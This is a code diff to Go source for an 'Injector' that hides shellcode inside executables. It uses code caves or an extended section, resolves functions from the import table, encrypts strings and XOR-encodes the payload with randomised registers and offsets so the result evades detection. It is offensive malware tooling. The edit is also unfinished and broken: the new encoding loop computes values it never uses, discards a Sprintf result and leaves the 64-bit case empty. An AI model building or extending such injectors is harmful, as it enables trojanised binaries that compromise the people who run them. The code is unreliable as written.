@@ -67,10 +67,6 @@ var (
 	}
 )
 
-var (
-	codeCaveModeStub = []byte{0x20, 0x25, 0x07, 0x18}
-)
-
 type loaderCtx struct {
 	// for replace registers
 	Reg  map[string]string
@@ -108,8 +104,7 @@ type loaderCtx struct {
 	EntryOffset   int
 	MemRegionSize int
 	ShellcodeSize int
-
-	CodeCaveStub []byte
+	ShellcodeKey  uint64
 }
 
 func (inj *Injector) buildLoader(shellcode []byte) ([]byte, error) {
@@ -122,22 +117,6 @@ func (inj *Injector) buildLoader(shellcode []byte) ([]byte, error) {
 		_ = inj.engine.Close()
 		inj.engine = nil
 	}()
-	// parse loader source template
-	var src string
-	switch inj.arch {
-	case "386":
-		src = inj.getLoaderX86()
-	case "amd64":
-		src = inj.getLoaderX64()
-	}
-	tpl, err := template.New("loader").Funcs(template.FuncMap{
-		"db":  toDB,
-		"hex": toHex,
-		"dr":  toRegDWORD,
-	}).Parse(src)
-	if err != nil {
-		return nil, fmt.Errorf("invalid loader template: %s", err)
-	}
 	// prepare loader context for build source
 	entryOffset := 16 + inj.rand.Intn(512)
 	memRegionSize := ((entryOffset+len(shellcode))/4096 + 1 + inj.rand.Intn(16)) * 4096
@@ -149,19 +128,33 @@ func (inj *Injector) buildLoader(shellcode []byte) ([]byte, error) {
 		EntryOffset:   entryOffset,
 		MemRegionSize: memRegionSize,
 		ShellcodeSize: len(shellcode),
-
-		CodeCaveStub: codeCaveModeStub,
 	}
 	err = inj.findProcFromIAT(ctx)
 	if err != nil {
 		return nil, err
 	}
 	inj.encryptStrings(ctx)
-	err = inj.selectMode(ctx, shellcode)
+	// get loader source template
+	var src string
+	switch inj.arch {
+	case "386":
+		src = inj.getLoaderX86()
+	case "amd64":
+		src = inj.getLoaderX64()
+	}
+	src, err = inj.selectLoadMode(ctx, shellcode, src)
 	if err != nil {
 		return nil, err
 	}
 	// process loader template and assemble it
+	tpl, err := template.New("loader").Funcs(template.FuncMap{
+		"db":  toDB,
+		"hex": toHex,
+		"dr":  toRegDWORD,
+	}).Parse(src)
+	if err != nil {
+		return nil, fmt.Errorf("invalid loader template: %s", err)
+	}
 	buf := bytes.NewBuffer(make([]byte, 0, 512))
 	err = tpl.Execute(buf, ctx)
 	if err != nil {
@@ -398,28 +391,68 @@ func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) 
 	return val, key
 }
 
-func (inj *Injector) selectMode(ctx *loaderCtx, shellcode []byte) error {
+func (inj *Injector) selectLoadMode(ctx *loaderCtx, sc []byte, src string) (string, error) {
 	// check need extend section
 	var numCaves int
 	switch inj.arch {
 	case "386":
-		numCaves = (len(shellcode)/4 + 1) * numInstForCopyShellcode
+		numCaves = (len(sc)/4 + 1) * numInstForCopyShellcode
 	case "amd64":
-		numCaves = (len(shellcode)/8 + 1) * numInstForCopyShellcode
+		numCaves = (len(sc)/8 + 1) * numInstForCopyShellcode
 	}
-
-	if inj.opts.DisableExtendSection {
-		return errors.New("shellcode is too large and extend section is disabled")
-	}
-	ctx.SectionMode = true
-	ctx.SectionOffset = inj.extendSection(shellcode)
-
 	if minNumCaves+numCaves > len(inj.caves) {
+		if inj.opts.DisableExtendSection {
+			return "", errors.New("shellcode is too large and extend section is disabled")
+		}
+		ctx.SectionMode = true
+		ctx.SectionOffset = inj.extendSection(sc)
+		return src, nil
+	}
+	// make sure shellcode is 4 or 8 bytes alignment
+	switch inj.arch {
+	case "386":
+		l := len(sc)
+		p := l % 4
+		if p != 0 {
+			sc = append(sc, bytes.Repeat([]byte{0x00}, 4-p)...)
+		}
+	case "amd64":
+		l := len(sc)
+		p := l % 8
+		if p != 0 {
+			sc = append(sc, bytes.Repeat([]byte{0x00}, 8-p)...)
+		}
+	}
+	// generate assembly source
+	// mov eax, 0x11223344     mov rax, 0x1122334455667788
+	// xor eax, ebx            xor rax, rbx
+	// mov [edi], eax          mov [rdi], rax
+	// add edi, 4              add rdi, 8
 
-		return nil
+	var stub string
+	switch inj.arch {
+	case "386":
+		for i := 0; i < len(sc); i += 4 {
+			reg := regVolatileX86[inj.rand.Intn(len(regVolatileX86))]
+			val := binary.LittleEndian.Uint32(sc[i:])
+			key := uint32(ctx.ShellcodeKey)
+
+			fmt.Sprintf(`
+              mov eax, 0x11223344
+              xor eax, ebx
+              mov [edi], eax
+              add edi, 4
+`)
+
+		}
+
+	case "amd64":
+
 	}
 
-	return nil
+	// replace the flag to assembly source
+
+	return src, nil
 }
 
 func toUTF16(s string) string {
